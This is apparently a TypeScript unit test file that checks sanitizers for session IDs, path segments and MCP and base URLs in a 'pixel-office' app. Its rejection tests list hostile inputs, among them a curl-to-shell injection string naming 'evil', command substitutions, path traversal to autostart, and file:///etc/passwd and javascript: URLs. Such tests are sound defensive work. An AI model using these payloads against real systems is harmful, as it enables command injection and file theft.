/**
 * Unit tests for the pixel-office boundary sanitizers (command-injection,
 * path-traversal, and MCP-URL guards).
 * Run: `npm test` (node's built-in test runner + TS type-stripping).
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { isValidSessionId, safeSeg, safeMcpUrl, isSecureBaseUrl } from '../src/main/officeSanitize.ts'

test('isValidSessionId accepts UUID-like transcript stems', () => {
  assert.ok(isValidSessionId('9f8c2e1a-0b3d-4c5e-8f9a-1b2c3d4e5f60'))
  assert.ok(isValidSessionId('abc_123-XYZ'))
})

test('isValidSessionId rejects shell metacharacters and injection payloads', () => {
  for (const bad of [
    'x;curl${IFS}evil|sh',
    'a b',
    'a;b',
    '$(whoami)',
    '`id`',
    'a"b',
    "a'b",
    'a|b',
    'a&b',
    'a\nb',
    '../x',
    '',
    'x'.repeat(65),
  ]) {
    assert.equal(isValidSessionId(bad), false, `should reject: ${JSON.stringify(bad)}`)
  }
})

test('isValidSessionId rejects non-strings', () => {
  assert.equal(isValidSessionId(undefined), false)
  assert.equal(isValidSessionId(null), false)
  assert.equal(isValidSessionId(42 as unknown), false)
})

test('safeSeg strips separators, traversal and leading dots', () => {
  assert.equal(safeSeg('../../../.config/autostart'), 'configautostart')
  assert.equal(safeSeg('..'), 'x')
  assert.equal(safeSeg('a/b\\c'), 'abc')
  assert.equal(safeSeg('.hidden'), 'hidden')
  assert.equal(safeSeg('good-slug_1.2'), 'good-slug_1.2')
  assert.equal(safeSeg(''), 'x')
  assert.equal(safeSeg(undefined), 'x')
})

test('safeSeg never yields a path separator', () => {
  for (const s of ['a/b', 'a\\b', 'a\0b', 'a..b/../c']) {
    const out = safeSeg(s)
    assert.ok(!/[/\\]/.test(out), `no separator in ${out}`)
  }
})

test('isSecureBaseUrl requires https except for loopback hosts', () => {
  // https anywhere is fine
  assert.ok(isSecureBaseUrl('https://office.example.com'))
  assert.ok(isSecureBaseUrl('https://autodev.code.aioffice.works'))
  // plain http off-loopback is rejected (cleartext password/token/key)
  assert.ok(!isSecureBaseUrl('http://office.example.com'))
  assert.ok(!isSecureBaseUrl('http://192.168.1.10'))
  // http to loopback is tolerated for local dev
  assert.ok(isSecureBaseUrl('http://localhost'))
  assert.ok(isSecureBaseUrl('http://localhost:8000'))
  assert.ok(isSecureBaseUrl('http://127.0.0.1:8000'))
  assert.ok(isSecureBaseUrl('http://[::1]:8000'))
  // non-http(s) / garbage / non-string rejected
  assert.ok(!isSecureBaseUrl('file:///etc/passwd'))
  assert.ok(!isSecureBaseUrl('not a url'))
  assert.ok(!isSecureBaseUrl(''))
  assert.ok(!isSecureBaseUrl(undefined))
})

test('safeMcpUrl rejects a same-origin http (non-loopback) downgrade', () => {
  const base = 'http://office.example.com'
  const fb = 'https://office.example.com/api/office-mcp'
  // even same-origin, plain http off-loopback must not carry the office key
  assert.equal(safeMcpUrl('http://office.example.com/api/office-mcp', base, fb), fb)
  // but a loopback dev office over http is allowed same-origin
  assert.equal(safeMcpUrl('http://localhost:8000/api/office-mcp', 'http://localhost:8000', 'http://localhost:8000/fb'), 'http://localhost:8000/api/office-mcp')
})

test('safeMcpUrl accepts only same-origin http(s), else falls back', () => {
  const base = 'https://office.example.com'
  const fb = 'https://office.example.com/api/office-mcp'
  // same origin honoured
  assert.equal(safeMcpUrl('https://office.example.com/api/office-mcp', base, fb), 'https://office.example.com/api/office-mcp')
  // off-origin rejected
  assert.equal(safeMcpUrl('https://evil.example.com/mcp', base, fb), fb)
  // non-http scheme rejected
  assert.equal(safeMcpUrl('file:///etc/passwd', base, fb), fb)
  assert.equal(safeMcpUrl('javascript:alert(1)', base, fb), fb)
  // garbage / empty / non-string rejected
  assert.equal(safeMcpUrl('not a url', base, fb), fb)
  assert.equal(safeMcpUrl('', base, fb), fb)
  assert.equal(safeMcpUrl(undefined, base, fb), fb)
})
